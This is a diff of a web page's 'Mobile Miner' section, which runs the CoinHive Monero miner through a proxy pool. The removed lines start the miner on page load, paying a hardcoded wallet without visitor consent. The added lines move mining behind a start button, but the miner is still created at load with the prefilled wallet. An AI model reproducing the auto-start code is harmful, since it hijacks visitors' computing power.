@@ -19,7 +19,7 @@
 
 		<!-- Header -->
 			<div id="header">
-				<a class="logo icon fa-spin fa-usd" href="#download"></a>
+				<a class="logo icon fa-usd" href="#download"></a>
 				<h1>"Change is inevitable, Growth is optional."</h1>
                 <p>Let me show you how to embrace change and secure financial growth with what you already have. 
 </p>
@@ -29,18 +29,24 @@
 			<div id="main">
 
 				<header class="major container 95%">
-                    <h5>Mobile Miner</h5><form>
-XMR Monero Wallet Address: <input type="text" name="txtJob" value="43FeFPuaspxAEU7ZGEY93YBmG8nkA1x1Pgg5kTh7mYuLXCzMP3hERey6QBdKKBciuqhsakJD44bGHhJX98V3VjbZ9r1LKzx"><br />
-<input type="submit" value="Start Mining">
-</form>
+                    <h5>Mobile Miner</h5>
+                    <form name="address">Please enter your XMR Monero Wallet Address: 
+
+                    
+                    <input class="form-control" name="uname" id="yourAddressInput" type="text" value="43FeFPuaspxAEU7ZGEY93YBmG8nkA1x1Pgg5kTh7mYuLXCzMP3hERey6QBdKKBciuqhsakJD44bGHhJX98V3VjbZ9r1LKzx">
+        <span class="input-group-btn"><button class="btn btn-default" type="button">
+            <span onclick="miner.start();" style="display: inline;"><i class="fa fa-refresh"></i> Start Mining</span>
+            <span onclick="miner.stop();" style="display: none;"><i class="fa fa-refresh fa-spin"></i> Mining... (Press again to stop)</span>
+        </button></span> </form>
+                    
                     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
   // Configure CoinHive to point to your proxy
   CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://pool.carpecrypto.me:8892"]];
 
   // Start miner
-  var miner = CoinHive.Anonymous('43FeFPuaspxAEU7ZGEY93YBmG8nkA1x1Pgg5kTh7mYuLXCzMP3hERey6QBdKKBciuqhsakJD44bGHhJX98V3VjbZ9r1LKzx');
-  miner.start();
+  var miner = CoinHive.Anonymous(document.forms['address']['uname'].value);
+    console.log("username value: "+ document.forms.address.uname.value);
 </script>
                     
 			</header> 
